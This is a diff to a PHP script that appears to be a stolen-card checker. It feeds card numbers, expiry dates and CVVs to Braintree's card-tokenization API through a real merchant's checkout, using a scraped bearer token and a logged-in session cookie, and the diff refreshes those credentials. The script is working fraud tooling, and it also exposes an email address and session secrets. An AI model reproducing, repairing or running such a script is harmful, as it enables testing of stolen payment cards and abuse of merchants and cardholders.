@@ -204,14 +204,14 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept: */*',
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
-'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTE3NTA3NTMsImp0aSI6IjgyMjU2NDZkLWRmNDUtNDZhMy1iZjEwLWQwNmNhNjc5Yzg4ZCIsInN1YiI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiQWlyc3RyZWFtSW5jX2luc3RhbnQifX0.3sXdEV3s90BhNKH4uKaugiVKr6JWavtUGQ-qk_1rzCdDV8de0vCW6haFMDCd2y0SIGP1Nm2WUkVpIus-NnamcA',
+'authorization: Bearer eyJ0eXAiOiJKV1QiLCJhbGciOiJFUzI1NiIsImtpZCI6IjIwMTgwNDI2MTYtcHJvZHVjdGlvbiIsImlzcyI6IkF1dGh5In0.eyJleHAiOjE1OTE3ODc1NjUsImp0aSI6ImM2MjZlY2M0LWMxNmYtNDJhYi1iYjNhLWQxMzA3MjNkOWM2MSIsInN1YiI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJpc3MiOiJBdXRoeSIsIm1lcmNoYW50Ijp7InB1YmxpY19pZCI6ImgyZ3ZwaG1odDJkZmc0NXIiLCJ2ZXJpZnlfY2FyZF9ieV9kZWZhdWx0IjpmYWxzZX0sInJpZ2h0cyI6WyJtYW5hZ2VfdmF1bHQiXSwib3B0aW9ucyI6eyJtZXJjaGFudF9hY2NvdW50X2lkIjoiQWlyc3RyZWFtSW5jX2luc3RhbnQifX0.dSsQ3wN5VJQ88WPY5u-pe0jV0B5A3jAcfAh7EkVmytxH202DKgJoYzt8rOj4OCAFgF5_zKNLfn99FD2SQsnt2Q',
 'braintree-version: 2018-05-10',
 'content-type: application/json',
 'origin: https://assets.braintreegateway.com',
 'referer: https://payments.braintree-api.com/',
 'user-agent: '.$browser.''
 ));
-curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"d2b7ea06-67b9-47d9-92d2-9d9fe5aa9728"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
+curl_setopt($ch, CURLOPT_POSTFIELDS, '{"clientSdkMetadata":{"source":"client","integration":"custom","sessionId":"e91e779c-3a53-4486-a042-2fde3d488153"},"query":"mutation TokenizeCreditCard($input: TokenizeCreditCardInput!) {   tokenizeCreditCard(input: $input) {     token     creditCard {       bin       brandCode       last4       binData {         prepaid         healthcare         debit         durbinRegulated         commercial         payroll         issuingBank         countryOfIssuance         productId       }     }   } }","variables":{"input":{"creditCard":{"number":"'.$cc.'","expirationMonth":"'.$mes.'","expirationYear":"'.$ano.'","cvv":"'.$cvv.'"},"options":{"validate":false}}},"operationName":"TokenizeCreditCard"}');
 
 $b_pago = curl_exec($ch);
 
@@ -262,7 +262,7 @@ curl_setopt($ch, CURLOPT_HTTPHEADER, array(
 'accept-encoding: gzip, deflate, br',
 'accept-language: en-US,en;q=0.9',
 'content-type: application/x-www-form-urlencoded; charset=UTF-8',
-'cookie: __cfduid=df5372fcdee78465656bb375d67509c131591513584; reduxPersistIndex=[%22persist:Airstream_Ecommerce_undefined_session%22]; tk_ai=woo%3Amy1J4AKRU55%2FBiz1dRU5ybIN; wordpress_logged_in_57c55ae70790bf394bcb2a7313c0b037=pubgkitt.u%40gmail.com%7C1592727982%7CRgZ7FQBMjE2zhlRXBWwnukm9v0GVhSByCWEbKa0har5%7C46f5f04f803cd95748af0da6c1c31872324017fb1b96fc0a337ed068f3208131; wp_woocommerce_session_57c55ae70790bf394bcb2a7313c0b037=2659%7C%7C1591691080%7C%7C1591687480%7C%7Cae1c2b7c25705f954be8e5c77531ba99; persist%3AAirstream_Ecommerce_undefined_session={%22loggedIn%22:%22true%22%2C%22username%22:%22%5C%22Vincent%5C%22%22%2C%22totalItemsInCart%22:%220%22%2C%22_persist%22:%22{%5C%22version%5C%22:-1%2C%5C%22rehydrated%5C%22:true}%22}; woocommerce_items_in_cart=1; woocommerce_cart_hash=97d0875ca548471533ae727af3f22d8d',
+'cookie: __cfduid=df5372fcdee78465656bb375d67509c131591513584; reduxPersistIndex=[%22persist:Airstream_Ecommerce_undefined_session%22]; tk_ai=woo%3Amy1J4AKRU55%2FBiz1dRU5ybIN; wordpress_logged_in_57c55ae70790bf394bcb2a7313c0b037=pubgkitt.u%40gmail.com%7C1592727982%7CRgZ7FQBMjE2zhlRXBWwnukm9v0GVhSByCWEbKa0har5%7C46f5f04f803cd95748af0da6c1c31872324017fb1b96fc0a337ed068f3208131; persist%3AAirstream_Ecommerce_undefined_session={%22loggedIn%22:%22true%22%2C%22username%22:%22%5C%22Vincent%5C%22%22%2C%22totalItemsInCart%22:%220%22%2C%22_persist%22:%22{%5C%22version%5C%22:-1%2C%5C%22rehydrated%5C%22:true}%22}; woocommerce_items_in_cart=1; wp_woocommerce_session_57c55ae70790bf394bcb2a7313c0b037=2659%7C%7C1591873952%7C%7C1591870352%7C%7Caaf5c6268cbf32822718492f5575efc6; woocommerce_cart_hash=97d0875ca548471533ae727af3f22d8d',
 'origin: https://airstreamsupplycompany.com',
 'referer: https://airstreamsupplycompany.com/checkout/',
 'user-agent: '.$browser.''
